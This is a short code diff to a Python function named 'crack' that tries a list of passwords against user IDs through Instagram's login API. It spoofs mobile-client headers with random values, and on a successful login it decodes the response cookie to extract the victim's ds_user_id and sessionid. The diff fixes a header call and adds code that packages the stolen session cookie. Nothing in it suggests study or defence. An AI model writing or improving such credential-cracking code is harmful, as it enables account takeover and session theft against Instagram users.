@@ -124,7 +124,7 @@ def crack(uid, pww, total_idz):
         for pw in pww:
             session = requests.Session()
             session.headers.update({
-            **self.HeadersApiLogin(),
+            **HeadersApiLogin(),
             'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
             'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
             'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
@@ -141,6 +141,7 @@ def crack(uid, pww, total_idz):
                 xyz = base64.b64decode(cok.split(':')[2]).decode()
                 ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                 sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
+                cokie = ({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
             else:
                 print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
